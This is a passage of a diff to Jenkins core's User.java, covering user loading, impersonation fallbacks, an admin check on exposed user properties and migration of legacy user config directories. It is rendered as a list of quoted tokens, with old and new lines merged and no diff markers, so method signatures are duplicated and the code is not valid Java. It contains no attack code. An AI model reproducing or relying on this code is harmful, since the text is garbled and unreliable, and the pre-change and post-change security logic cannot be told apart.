".", "getName", "(", ")", "+", "\"", ".", "allowUserCreationViaUrl", "\"", ");", "/", "**", "*", "The", "username", "of", "the", "'", "unknown", "'", "user", "used", "to", "avoid", "null", "user", "references", ".", "*", "/", "@", "@", "-", "147", ",", "23", "+", "172", ",", "72", "@", "@", "*", "/", "private", "static", "final", "String", "[", "]", "ILLEGAL_PERSISTED_USERNAMES", "=", "new", "String", "[", "]{", "ACL", ".", "ANONYMOUS_USERNAME", ",", "ACL", ".", "SYSTEM_USERNAME", ",", "UNKNOWN_USERNAME", "}", ";", "private", "transient", "final", "String", "id", ";", "private", "final", "int", "version", "=", "10", ";", "/", "/", "Not", "currently", "used", ",", "but", "it", "may", "be", "helpful", "in", "the", "future", "to", "store", "a", "version", ".", "private", "String", "id", ";", "private", "volatile", "String", "fullName", ";", "private", "volatile", "String", "description", ";", "/", "**", "*", "List", "of", "{", "@", "link", "UserProperty", "}", "s", "configured", "for", "this", "project", ".", "*", "/", "@", "CopyOnWrite", "private", "volatile", "List", "<", "UserProperty", ">", "properties", "=", "new", "ArrayList", "<", "UserProperty", ">", "()", ";", "private", "volatile", "List", "<", "UserProperty", ">", "properties", "=", "new", "ArrayList", "<", ">(", ");", "static", "{", "XSTREAM", ".", "alias", "(", "\"", "user", "\"", ",", "User", ".", "class", ")", ";", "}", "private", "User", "(", "String", "id", ",", "String", "fullName", ")", "{", "this", ".", "id", "=", "id", ";", "this", ".", "fullName", "=", "fullName", ";", "load", "(", ");", "load", "(", "id", ")", ";", "}", "private", "void", "load", "(", "String", "userId", ")", "{", "clearExistingProperties", "(", ");", "loadFromUserConfigFile", "(", "userId", ")", ";", "removeNullsThatFailedToLoad", "(", ");", "allocateDefaultPropertyInstancesAsNeeded", "(", ");", "setUserToProperties", "(", ");", "}", "private", "void", "setUserToProperties", "(", ")", "{", "for", "(", "UserProperty", "p", ":", "properties", ")", "{", "p", ".", "setUser", "(", "this", ")", ";", "}", "}", "private", "void", "allocateDefaultPropertyInstancesAsNeeded", "(", ")", "{", "for", "(", "UserPropertyDescriptor", "d", ":", "UserProperty", ".", "all", "(", "))", "{", "if", "(", "getProperty", "(", "d", ".", "clazz", ")", "=", "=", "null", ")", "{", "UserProperty", "up", "=", "d", ".", "newInstance", "(", "this", ")", ";", "if", "(", "up", "!", "=", "null", ")", "properties", ".", "add", "(", "up", ")", ";", "}", "}", "}", "private", "void", "removeNullsThatFailedToLoad", "(", ")", "{", "properties", ".", "removeIf", "(", "Objects", ":", ":", "isNull", ")", ";", "}", "private", "void", "loadFromUserConfigFile", "(", "String", "userId", ")", "{", "XmlFile", "config", "=", "getConfigFile", "(", ");", "try", "{", "if", "(", "config", "!", "=", "null", "&", "&", "config", ".", "exists", "(", "))", "{", "config", ".", "unmarshal", "(", "this", ")", ";", "this", ".", "id", "=", "userId", ";", "}", "}", "catch", "(", "IOException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "\"", "Failed", "to", "load", "\"", "+", "config", ",", "e", ")", ";", "}", "}", "private", "void", "clearExistingProperties", "(", ")", "{", "properties", ".", "clear", "(", ");", "}", "private", "XmlFile", "getConfigFile", "(", ")", "{", "File", "existingUserFolder", "=", "getExistingUserFolder", "(", ");", "return", "existingUserFolder", "=", "=", "null", "?", "null", ":", "new", "XmlFile", "(", "XSTREAM", ",", "new", "File", "(", "existingUserFolder", ",", "CONFIG_XML", ")", ");", "}", "/", "**", "@", "@", "-", "175", ",", "79", "+", "249", ",", "49", "@", "@", "private", "User", "(", "String", "id", ",", "String", "fullName", ")", "{", "*", "/", "@", "Nonnull", "public", "static", "IdStrategy", "idStrategy", "(", ")", "{", "Jenkins", "j", "=", "Jenkins", ".", "getInstance", "(", ");", "Jenkins", "j", "=", "Jenkins", ".", "get", "(", ");", "SecurityRealm", "realm", "=", "j", ".", "getSecurityRealm", "(", ");", "if", "(", "realm", "=", "=", "null", ")", "{", "return", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "}", "return", "realm", ".", "getUserIdStrategy", "(", ");", "}", "public", "int", "compareTo", "(", "User", "that", ")", "{", "public", "int", "compareTo", "(", "@", "Nonnull", "User", "that", ")", "{", "return", "idStrategy", "(", ").", "compare", "(", "this", ".", "id", ",", "that", ".", "id", ")", ";", "}", "/", "**", "*", "Loads", "the", "other", "data", "from", "disk", "if", "it", "'", "s", "available", ".", "*", "/", "private", "synchronized", "void", "load", "(", ")", "{", "properties", ".", "clear", "(", ");", "XmlFile", "config", "=", "getConfigFile", "(", ");", "try", "{", "if", "(", "config", ".", "exists", "(", "))", "config", ".", "unmarshal", "(", "this", ")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "\"", "Failed", "to", "load", "\"", "+", "config", ",", "e", ")", ";", "}", "/", "/", "remove", "nulls", "that", "have", "failed", "to", "load", "for", "(", "Iterator", "<", "UserProperty", ">", "itr", "=", "properties", ".", "iterator", "(", ");", "itr", ".", "hasNext", "(", ");", ")", "{", "if", "(", "itr", ".", "next", "(", ")=", "=", "null", ")", "itr", ".", "remove", "(", ");", "}", "/", "/", "allocate", "default", "instances", "if", "needed", ".", "/", "/", "doing", "so", "after", "load", "makes", "sure", "that", "newly", "added", "user", "properties", "do", "get", "reflected", "for", "(", "UserPropertyDescriptor", "d", ":", "UserProperty", ".", "all", "(", "))", "{", "if", "(", "getProperty", "(", "d", ".", "clazz", ")", "==", "null", ")", "{", "UserProperty", "up", "=", "d", ".", "newInstance", "(", "this", ")", ";", "if", "(", "up", "!", "=", "null", ")", "properties", ".", "add", "(", "up", ")", ";", "}", "}", "for", "(", "UserProperty", "p", ":", "properties", ")", "p", ".", "setUser", "(", "this", ")", ";", "}", "@", "Exported", "public", "String", "getId", "(", ")", "{", "return", "id", ";", "}", "public", "@", "Nonnull", "String", "getUrl", "(", ")", "{", "return", "\"", "user", "/", "\"+", "Util", ".", "rawEncode", "(", "idStrategy", "(", ").", "keyFor", "(", "id", ")", ");", "public", "@", "Nonnull", "String", "getUrl", "(", ")", "{", "return", "\"", "user", "/", "\"", "+", "Util", ".", "rawEncode", "(", "idStrategy", "(", ").", "keyFor", "(", "id", ")", ");", "}", "public", "@", "Nonnull", "String", "getSearchUrl", "(", ")", "{", "return", "\"", "/", "user", "/", "\"+", "Util", ".", "rawEncode", "(", "idStrategy", "(", ").", "keyFor", "(", "id", ")", ");", "public", "@", "Nonnull", "String", "getSearchUrl", "(", ")", "{", "return", "\"", "/", "user", "/", "\"", "+", "Util", ".", "rawEncode", "(", "idStrategy", "(", ").", "keyFor", "(", "id", ")", ");", "}", "/", "**", "*", "The", "URL", "of", "the", "user", "page", ".", "*", "/", "@", "Exported", "(", "visibility", "=", "999", ")", "public", "@", "Nonnull", "String", "getAbsoluteUrl", "(", ")", "{", "return", "Jenkins", ".", "getInstance", "(", ").", "getRootUrl", "(", ")+", "getUrl", "(", ");", "@", "Exported", "(", "visibility", "=", "999", ")", "public", "@", "Nonnull", "String", "getAbsoluteUrl", "(", ")", "{", "return", "Jenkins", ".", "get", "(", ").", "getRootUrl", "(", ")", "+", "getUrl", "(", ");", "}", "/", "**", "*", "Gets", "the", "human", "readable", "name", "of", "this", "user", ".", "*", "This", "is", "configurable", "by", "the", "user", ".", "*", "/", "@", "Exported", "(", "visibility", "=", "999", ")", "public", "@", "Nonnull", "String", "getFullName", "(", ")", "{", "@", "Exported", "(", "visibility", "=", "999", ")", "public", "@", "Nonnull", "String", "getFullName", "(", ")", "{", "return", "fullName", ";", "}", "@", "@", "-", "256", ",", "18", "+", "300", ",", "19", "@", "@", "public", "String", "getId", "(", ")", "{", "*", "If", "the", "input", "parameter", "is", "empty", ",", "the", "user", "'", "s", "ID", "will", "be", "set", ".", "*", "/", "public", "void", "setFullName", "(", "String", "name", ")", "{", "if", "(", "Util", ".", "fixEmptyAndTrim", "(", "name", ")", "==", "null", ")", "name", "=", "id", ";", "if", "(", "Util", ".", "fixEmptyAndTrim", "(", "name", ")", "=", "=", "null", ")", "name", "=", "id", ";", "this", ".", "fullName", "=", "name", ";", "}", "@", "Exported", "public", "@", "CheckForNull", "String", "getDescription", "(", ")", "{", "public", "@", "CheckForNull", "String", "getDescription", "(", ")", "{", "return", "description", ";", "}", "/", "**", "*", "Sets", "the", "description", "of", "the", "user", ".", "*", "*", "@", "since", "1", ".", "609", "*", "/", "public", "void", "setDescription", "(", "String", "description", ")", "{", "@", "@", "-", "277", ",", "7", "+", "322", ",", "7", "@", "@", "public", "void", "setDescription", "(", "String", "description", ")", "{", "/", "**", "*", "Gets", "the", "user", "properties", "configured", "for", "this", "user", ".", "*", "/", "public", "Map", "<", "Descriptor", "<", "UserProperty", ">", ",", "UserProperty", ">", "getProperties", "(", ")", "{", "public", "Map", "<", "Descriptor", "<", "UserProperty", ">", ",", "UserProperty", ">", "getProperties", "(", ")", "{", "return", "Descriptor", ".", "toMap", "(", "properties", ")", ";", "}", "@", "@", "-", "286", ",", "8", "+", "331", ",", "8", "@", "@", "public", "void", "setDescription", "(", "String", "description", ")", "{", "*", "/", "public", "synchronized", "void", "addProperty", "(", "@", "Nonnull", "UserProperty", "p", ")", "throws", "IOException", "{", "UserProperty", "old", "=", "getProperty", "(", "p", ".", "getClass", "(", "))", ";", "List", "<", "UserProperty", ">", "ps", "=", "new", "ArrayList", "<", "UserProperty", ">", "(", "properties", ")", ";", "if", "(", "old", "!", "=", "null", ")", "List", "<", "UserProperty", ">", "ps", "=", "new", "ArrayList", "<", ">(", "properties", ")", ";", "if", "(", "old", "!", "=", "null", ")", "ps", ".", "remove", "(", "old", ")", ";", "ps", ".", "add", "(", "p", ")", ";", "p", ".", "setUser", "(", "this", ")", ";", "@", "@", "-", "298", ",", "85", "+", "343", ",", "82", "@", "@", "public", "synchronized", "void", "addProperty", "(", "@", "Nonnull", "UserProperty", "p", ")", "throws", "IOException", "/", "**", "*", "List", "of", "all", "{", "@", "link", "UserProperty", "}", "s", "exposed", "primarily", "for", "the", "remoting", "API", ".", "*", "/", "@", "Exported", "(", "name", "=", "\"", "property", "\"", ",", "inline", "=", "true", ")", "@", "Exported", "(", "name", "=", "\"", "property", "\"", ",", "inline", "=", "true", ")", "public", "List", "<", "UserProperty", ">", "getAllProperties", "(", ")", "{", "if", "(", "hasPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ")", "{", "return", "Collections", ".", "unmodifiableList", "(", "properties", ")", ";", "}", "return", "Collections", ".", "emptyList", "(", ");", "}", "/", "**", "*", "Gets", "the", "specific", "property", ",", "or", "null", ".", "*", "/", "public", "<", "T", "extends", "UserProperty", ">", "T", "getProperty", "(", "Class", "<", "T", ">", "clazz", ")", "{", "for", "(", "UserProperty", "p", ":", "properties", ")", "{", "if", "(", "clazz", ".", "isInstance", "(", "p", ")", ")", "if", "(", "clazz", ".", "isInstance", "(", "p", ")", ")", "return", "clazz", ".", "cast", "(", "p", ")", ";", "}", "return", "null", ";", "}", "/", "**", "*", "Creates", "an", "{", "@", "link", "Authentication", "}", "object", "that", "represents", "this", "user", ".", "*", "*", "<", "p", ">", "*", "This", "method", "checks", "with", "{", "@", "link", "SecurityRealm", "}", "if", "the", "user", "is", "a", "valid", "user", "that", "can", "login", "to", "the", "security", "realm", ".", "*", "If", "{", "@", "link", "SecurityRealm", "}", "is", "a", "kind", "that", "does", "not", "support", "querying", "information", "about", "other", "users", ",", "this", "will", "*", "use", "{", "@", "link", "LastGrantedAuthoritiesProperty", "}", "to", "pick", "up", "the", "granted", "authorities", "as", "of", "the", "last", "time", "the", "user", "has", "*", "logged", "in", ".", "*", "*", "@", "throws", "UsernameNotFoundException", "*", "If", "this", "user", "is", "not", "a", "valid", "user", "in", "the", "backend", "{", "@", "link", "SecurityRealm", "}", ".", "*", "@", "throws", "UsernameNotFoundException", "If", "this", "user", "is", "not", "a", "valid", "user", "in", "the", "backend", "{", "@", "link", "SecurityRealm", "}", ".", "*", "@", "since", "1", ".", "419", "*", "/", "public", "@", "Nonnull", "Authentication", "impersonate", "(", ")", "throws", "UsernameNotFoundException", "{", "public", "@", "Nonnull", "Authentication", "impersonate", "(", ")", "throws", "UsernameNotFoundException", "{", "return", "this", ".", "impersonate", "(", "this", ".", "getUserDetailsForImpersonation", "(", "))", ";", "}", "/", "**", "*", "This", "method", "checks", "with", "{", "@", "link", "SecurityRealm", "}", "if", "the", "user", "is", "a", "valid", "user", "that", "can", "login", "to", "the", "security", "realm", ".", "*", "If", "{", "@", "link", "SecurityRealm", "}", "is", "a", "kind", "that", "does", "not", "support", "querying", "information", "about", "other", "users", ",", "this", "will", "*", "use", "{", "@", "link", "LastGrantedAuthoritiesProperty", "}", "to", "pick", "up", "the", "granted", "authorities", "as", "of", "the", "last", "time", "the", "user", "has", "*", "logged", "in", ".", "*", "*", "@", "return", "userDetails", "for", "the", "user", ",", "in", "case", "he", "'", "s", "not", "found", "but", "seems", "legitimate", ",", "we", "provide", "a", "userDetails", "with", "minimum", "access", "*", "*", "@", "throws", "UsernameNotFoundException", "*", "If", "this", "user", "is", "not", "a", "valid", "user", "in", "the", "backend", "{", "@", "link", "SecurityRealm", "}", ".", "*", "@", "throws", "UsernameNotFoundException", "If", "this", "user", "is", "not", "a", "valid", "user", "in", "the", "backend", "{", "@", "link", "SecurityRealm", "}", ".", "*", "/", "public", "@", "Nonnull", "UserDetails", "getUserDetailsForImpersonation", "(", ")", "throws", "UsernameNotFoundException", "{", "public", "@", "Nonnull", "UserDetails", "getUserDetailsForImpersonation", "(", ")", "throws", "UsernameNotFoundException", "{", "ImpersonatingUserDetailsService", "userDetailsService", "=", "new", "ImpersonatingUserDetailsService", "(", "Jenkins", ".", "getInstance", "(", ").", "getSecurityRealm", "(", ").", "getSecurityComponents", "(", ").", "userDetails", "Jenkins", ".", "get", "(", ").", "getSecurityRealm", "(", ").", "getSecurityComponents", "(", ").", "userDetails", ")", ";", "try", "{", "UserDetails", "userDetails", "=", "userDetailsService", ".", "loadUserByUsername", "(", "id", ")", ";", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "Impersonation", "of", "the", "user", "{", "0", "}", "was", "a", "success", "\"", ",", "new", "Object", "[", "]{", "id", "}", ");", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "Impersonation", "of", "the", "user", "{", "0", "}", "was", "a", "success", "\"", ",", "id", ")", ";", "return", "userDetails", ";", "}", "catch", "(", "UserMayOrMayNotExistException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "The", "user", "{", "0", "}", "may", "or", "may", "not", "exist", "in", "the", "SecurityRealm", ",", "so", "we", "provide", "minimum", "access", "\"", ",", "new", "Object", "[", "]{", "id", "}", ");", "/", "/", "backend", "can", "'", "t", "load", "information", "about", "other", "users", ".", "so", "use", "the", "stored", "information", "if", "available", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "The", "user", "{", "0", "}", "may", "or", "may", "not", "exist", "in", "the", "SecurityRealm", ",", "so", "we", "provide", "minimum", "access", "\"", ",", "id", ")", ";", "}", "catch", "(", "UsernameNotFoundException", "e", ")", "{", "/", "/", "if", "the", "user", "no", "longer", "exists", "in", "the", "backend", ",", "we", "need", "to", "refuse", "impersonating", "this", "user", "if", "(", "ALLOW_NON_EXISTENT_USER_TO_LOGIN", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "The", "user", "{", "0", "}", "was", "not", "found", "in", "the", "SecurityRealm", "but", "we", "are", "required", "to", "let", "it", "pass", ",", "due", "to", "ALLOW_NON_EXISTENT_USER_TO_LOGIN", "\"", ",", "new", "Object", "[", "]{", "id", "}", ");", "}", "else", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "The", "user", "{", "0", "}", "was", "not", "found", "in", "the", "SecurityRealm", "\"", ",", "new", "Object", "[", "]{", "id", "}", ");", "if", "(", "ALLOW_NON_EXISTENT_USER_TO_LOGIN", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "The", "user", "{", "0", "}", "was", "not", "found", "in", "the", "SecurityRealm", "but", "we", "are", "required", "to", "let", "it", "pass", ",", "due", "to", "ALLOW_NON_EXISTENT_USER_TO_LOGIN", "\"", ",", "id", ")", ";", "}", "else", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "The", "user", "{", "0", "}", "was", "not", "found", "in", "the", "SecurityRealm", "\"", ",", "id", ")", ";", "throw", "e", ";", "}", "}", "catch", "(", "DataAccessException", "e", ")", "{", "/", "/", "seems", "like", "it", "'", "s", "in", "the", "same", "boat", "as", "UserMayOrMayNotExistException", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "The", "user", "{", "0", "}", "retrieval", "just", "threw", "a", "DataAccess", "exception", "with", "msg", "=", "{", "1", "}", ",", "so", "we", "provide", "minimum", "access", "\"", ",", "new", "Object", "[", "]{", "id", ",", "e", ".", "getMessage", "(", ")", "}", ");", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "The", "user", "{", "0", "}", "retrieval", "just", "threw", "a", "DataAccess", "exception", "with", "msg", "=", "{", "1", "}", ",", "so", "we", "provide", "minimum", "access", "\"", ",", "new", "Object", "[", "]{", "id", ",", "e", ".", "getMessage", "(", ")}", ");", "}", "return", "new", "LegitimateButUnknownUserDetails", "(", "id", ")", ";", "}", "/", "**", "*", "Only", "used", "for", "a", "legitimate", "user", "we", "have", "no", "idea", "about", ".", "We", "give", "it", "only", "minimum", "access", "*", "/", "private", "static", "class", "LegitimateButUnknownUserDetails", "extends", "org", ".", "acegisecurity", ".", "userdetails", ".", "User", "{", "private", "static", "class", "LegitimateButUnknownUserDetails", "extends", "org", ".", "acegisecurity", ".", "userdetails", ".", "User", "{", "private", "LegitimateButUnknownUserDetails", "(", "String", "username", ")", "throws", "IllegalArgumentException", "{", "super", "(", "username", ",", "\"", "\",", "@", "@", "-", "393", ",", "20", "+", "435", ",", "21", "@", "@", "private", "LegitimateButUnknownUserDetails", "(", "String", "username", ")", "throws", "IllegalArgumentE", "*", "@", "see", "#", "getUserDetailsForImpersonation", "(", ")", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "@", "Nonnull", "Authentication", "impersonate", "(", "@", "Nonnull", "UserDetails", "userDetails", ")", "{", "public", "@", "Nonnull", "Authentication", "impersonate", "(", "@", "Nonnull", "UserDetails", "userDetails", ")", "{", "return", "new", "UsernamePasswordAuthenticationToken", "(", "userDetails", ".", "getUsername", "(", "),", "\"", "\",", "userDetails", ".", "getAuthorities", "(", "))", ";", "}", "/", "**", "*", "Accepts", "the", "new", "description", ".", "*", "/", "@", "RequirePOST", "public", "synchronized", "void", "doSubmitDescription", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", ",", "ServletException", "{", "public", "void", "doSubmitDescription", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", "{", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "description", "=", "req", ".", "getParameter", "(", "\"", "description", "\"", ");", "save", "(", ");", "rsp", ".", "sendRedirect", "(", "\".", "\")", ";", "/", "/", "go", "to", "the", "top", "page", "}", "@", "@", "-", "422", ",", "177", "+", "465", ",", "77", "@", "@", "public", "synchronized", "void", "doSubmitDescription", "(", "StaplerRequest", "req", ",", "StaplerRespons", "/", "**", "*", "Gets", "the", "{", "@", "link", "User", "}", "object", "by", "its", "id", "or", "full", "name", ".", "*", "*", "@", "param", "create", "*", "If", "true", ",", "this", "method", "will", "never", "return", "null", "for", "valid", "input", "*", "(", "by", "creating", "a", "new", "{", "@", "link", "User", "}", "object", "if", "none", "exists", ".", ")", "*", "If", "false", ",", "this", "method", "will", "return", "null", "if", "{", "@", "link", "User", "}", "object", "*", "with", "the", "given", "name", "doesn", "'", "t", "exist", ".", "*", "@", "param", "create", "If", "true", ",", "this", "method", "will", "never", "return", "null", "for", "valid", "input", "*", "(", "by", "creating", "a", "new", "{", "@", "link", "User", "}", "object", "if", "none", "exists", ".", ")", "*", "If", "false", ",", "this", "method", "will", "return", "null", "if", "{", "@", "link", "User", "}", "object", "*", "with", "the", "given", "name", "doesn", "'", "t", "exist", ".", "*", "@", "return", "Requested", "user", ".", "May", "be", "{", "@", "code", "null", "}", "if", "a", "user", "does", "not", "exist", "and", "*", "{", "@", "code", "create", "}", "is", "false", ".", "*", "{", "@", "code", "create", "}", "is", "false", ".", "*", "@", "deprecated", "use", "{", "@", "link", "User", "#", "get", "(", "String", ",", "boolean", ",", "java", ".", "util", ".", "Map", ")", "}", "*", "/", "@", "Deprecated", "public", "static", "@", "Nullable", "User", "get", "(", "String", "idOrFullName", ",", "boolean", "create", ")", "{", "public", "static", "@", "Nullable", "User", "get", "(", "String", "idOrFullName", ",", "boolean", "create", ")", "{", "return", "get", "(", "idOrFullName", ",", "create", ",", "Collections", ".", "emptyMap", "(", "))", ";", "}", "/", "**", "*", "Gets", "the", "{", "@", "link", "User", "}", "object", "by", "its", "id", "or", "full", "name", ".", "*", "*", "<", "p", ">", "*", "In", "order", "to", "resolve", "the", "user", "ID", ",", "the", "method", "invokes", "{", "@", "link", "CanonicalIdResolver", "}", "extension", "points", ".", "*", "Note", "that", "it", "may", "cause", "significant", "performance", "degradation", ".", "*", "If", "you", "are", "sure", "the", "passed", "value", "is", "a", "User", "ID", ",", "it", "is", "recommended", "to", "use", "{", "@", "link", "#", "getById", "(", "String", ",", "boolean", ")", "}.", "*", "*", "@", "param", "create", "*", "If", "true", ",", "this", "method", "will", "never", "return", "null", "for", "valid", "input", "*", "(", "by", "creating", "a", "new", "{", "@", "link", "User", "}", "object", "if", "none", "exists", ".", ")", "*", "If", "false", ",", "this", "method", "will", "return", "null", "if", "{", "@", "link", "User", "}", "object", "*", "with", "the", "given", "name", "doesn", "'", "t", "exist", ".", "*", "*", "@", "param", "context", "*", "contextual", "environment", "this", "user", "idOfFullName", "was", "retrieved", "from", ",", "*", "that", "can", "help", "resolve", "the", "user", "ID", "*", "*", "@", "return", "*", "An", "existing", "or", "created", "user", ".", "May", "be", "{", "@", "code", "null", "}", "if", "a", "user", "does", "not", "exist", "and", "*", "{", "@", "code", "create", "}", "is", "false", ".", "*", "@", "param", "create", "If", "true", ",", "this", "method", "will", "never", "return", "null", "for", "valid", "input", "*", "(", "by", "creating", "a", "new", "{", "@", "link", "User", "}", "object", "if", "none", "exists", ".", ")", "*", "If", "false", ",", "this", "method", "will", "return", "null", "if", "{", "@", "link", "User", "}", "object", "*", "with", "the", "given", "name", "doesn", "'", "t", "exist", ".", "*", "@", "param", "context", "contextual", "environment", "this", "user", "idOfFullName", "was", "retrieved", "from", ",", "*", "that", "can", "help", "resolve", "the", "user", "ID", "*", "@", "return", "An", "existing", "or", "created", "user", ".", "May", "be", "{", "@", "code", "null", "}", "if", "a", "user", "does", "not", "exist", "and", "*", "{", "@", "code", "create", "}", "is", "false", ".", "*", "/", "public", "static", "@", "Nullable", "User", "get", "(", "String", "idOrFullName", ",", "boolean", "create", ",", "@", "Nonnull", "Map", "context", ")", "{", "if", "(", "idOrFullName", "=", "=", "null", ")", "public", "static", "@", "Nullable", "User", "get", "(", "String", "idOrFullName", ",", "boolean", "create", ",", "@", "Nonnull", "Map", "context", ")", "{", "if", "(", "idOrFullName", "=", "=", "null", ")", "{", "return", "null", ";", "}", "/", "/", "TODO", ":", "In", "many", "cases", "the", "method", "should", "receive", "the", "canonical", "ID", ".", "/", "/", "Maybe", "it", "makes", "sense", "to", "try", "AllUsers", ".", "byName", "(", ").", "get", "(", "idkey", ")", "before", "invoking", "all", "resolvers", "and", "other", "stuff", "/", "/", "oleg", "-", "nenashev", ":", "FullNameResolver", "with", "User", ".", "getAll", "(", ")", "loading", "and", "iteration", "makes", "me", "think", "it", "'", "s", "a", "good", "idea", ".", "User", "user", "=", "AllUsers", ".", "get", "(", "idOrFullName", ")", ";", "if", "(", "user", "!", "=", "null", ")", "{", "return", "user", ";", "}", "String", "id", "=", "CanonicalIdResolver", ".", "resolve", "(", "idOrFullName", ",", "context", ")", ";", "/", "/", "DefaultUserCanonicalIdResolver", "will", "always", "return", "a", "non", "-", "null", "id", "if", "all", "other", "CanonicalIdResolver", "failed", "if", "(", "id", "=", "=", "null", ")", "{", "throw", "new", "IllegalStateException", "(", "\"", "The", "user", "id", "should", "be", "always", "non", "-", "null", "thanks", "to", "DefaultUserCanonicalIdResolver", "\"", ");", "}", "return", "getOrCreate", "(", "id", ",", "idOrFullName", ",", "create", ")", ";", "return", "getOrCreateById", "(", "id", ",", "idOrFullName", ",", "create", ")", ";", "}", "/", "**", "*", "Retrieve", "a", "user", "by", "its", "ID", ",", "and", "create", "a", "new", "one", "if", "requested", ".", "*", "@", "return", "*", "An", "existing", "or", "created", "user", ".", "May", "be", "{", "@", "code", "null", "}", "if", "a", "user", "does", "not", "exist", "and", "*", "{", "@", "code", "create", "}", "is", "false", ".", "*", "*", "@", "return", "An", "existing", "or", "created", "user", ".", "May", "be", "{", "@", "code", "null", "}", "if", "a", "user", "does", "not", "exist", "and", "*", "{", "@", "code", "create", "}", "is", "false", ".", "*", "/", "private", "static", "@", "Nullable", "User", "getOrCreate", "(", "@", "Nonnull", "String", "id", ",", "@", "Nonnull", "String", "fullName", ",", "boolean", "create", ")", "{", "return", "getOrCreate", "(", "id", ",", "fullName", ",", "create", ",", "getUnsanitizedLegacyConfigFileFor", "(", "id", ")", ");", "}", "private", "static", "@", "Nullable", "User", "getOrCreate", "(", "@", "Nonnull", "String", "id", ",", "@", "Nonnull", "String", "fullName", ",", "boolean", "create", ",", "File", "unsanitizedLegacyConfigFile", ")", "{", "String", "idkey", "=", "idStrategy", "(", ").", "keyFor", "(", "id", ")", ";", "byNameLock", ".", "readLock", "(", ").", "lock", "(", ");", "User", "u", ";", "try", "{", "u", "=", "AllUsers", ".", "byName", "(", ").", "get", "(", "idkey", ")", ";", "}", "finally", "{", "byNameLock", ".", "readLock", "(", ").", "unlock", "(", ");", "}", "final", "File", "configFile", "=", "getConfigFileFor", "(", "id", ")", ";", "boolean", "mustMigrateLegacyConfig", "=", "isMigrationRequiredForLegacyConfigFile", "(", "unsanitizedLegacyConfigFile", ",", "configFile", ")", ";", "if", "(", "mustMigrateLegacyConfig", ")", "{", "File", "ancestor", "=", "unsanitizedLegacyConfigFile", ".", "getParentFile", "(", ");", "if", "(", "!", "configFile", ".", "exists", "(", "))", "{", "try", "{", "Files", ".", "createDirectory", "(", "configFile", ".", "getParentFile", "(", ").", "toPath", "(", "))", ";", "Files", ".", "move", "(", "unsanitizedLegacyConfigFile", ".", "toPath", "(", "),", "configFile", ".", "toPath", "(", "))", ";", "LOGGER", ".", "log", "(", "Level", ".", "INFO", ",", "\"", "Migrated", "user", "record", "from", "{", "0", "}", "to", "{", "1", "}", "\",", "new", "Object", "[", "]", "{", "unsanitizedLegacyConfigFile", ",", "configFile", "}", ");", "}", "catch", "(", "IOException", "|", "InvalidPathException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "String", ".", "format", "(", "\"", "Failed", "to", "migrate", "user", "record", "from", "%", "s", "to", "%", "s", "\"", ",", "unsanitizedLegacyConfigFile", ",", "configFile", ")", ",", "e", ")", ";", "}", "}", "/", "/", "Don", "'", "t", "clean", "up", "ancestors", "with", "other", "children", ";", "the", "directories", "should", "be", "cleaned", "up", "when", "the", "last", "child", "/", "/", "is", "migrated", "File", "tmp", "=", "ancestor", ";", "try", "{", "while", "(", "!", "ancestor", ".", "equals", "(", "getRootDir", "(", "))", ")", "{", "try", "(", "DirectoryStream", "<", "Path", ">", "stream", "=", "Files", ".", "newDirectoryStream", "(", "ancestor", ".", "toPath", "(", "))", ")", "{", "if", "(", "!", "stream", ".", "iterator", "(", ").", "hasNext", "(", "))", "{", "tmp", "=", "ancestor", ";", "ancestor", "=", "tmp", ".", "getParentFile", "(", ");", "Files", ".", "deleteIfExists", "(", "tmp", ".", "toPath", "(", "))", ";", "}", "else", "{", "break", ";", "}", "}", "}", "}", "catch", "(", "IOException", "|", "InvalidPathException", "e", ")", "{", "if", "(", "LOGGER", ".", "isLoggable", "(", "Level", ".", "FINE", ")", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "Could", "not", "delete", "\"", "+", "tmp", "+", "\"", "when", "cleaning", "up", "legacy", "user", "directories", "\"", ",", "e", ")", ";", "}", "}", "}", "if", "(", "u", "=", "=", "null", "&", "&", "(", "create", "|", "|", "configFile", ".", "exists", "(", "))", ")", "{", "User", "tmp", "=", "new", "User", "(", "id", ",", "fullName", ")", ";", "User", "prev", ";", "byNameLock", ".", "readLock", "(", ").", "lock", "(", ");", "try", "{", "prev", "=", "AllUsers", ".", "byName", "(", ").", "putIfAbsent", "(", "idkey", ",", "u", "=", "tmp", ")", ";", "}", "finally", "{", "byNameLock", ".", "readLock", "(", ").", "unlock", "(", ");", "}", "if", "(", "prev", "!", "=", "null", ")", "{", "u", "=", "prev", ";", "/", "/", "if", "some", "has", "already", "put", "a", "value", "in", "the", "map", ",", "use", "it", "if", "(", "LOGGER", ".", "isLoggable", "(", "Level", ".", "FINE", ")", "&", "&", "!", "fullName", ".", "equals", "(", "prev", ".", "getFullName", "(", "))", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "mismatch", "on", "fullName", "(", "\u2018\"", "+", "fullName", "+", "\"", "\u2019", "vs", ".", "\u2018", "\"", "+", "prev", ".", "getFullName", "(", ")", "+", "\"", "\u2019)", "for", "\u2018", "\"", "+", "id", "+", "\"", "\u2019\"", ",", "new", 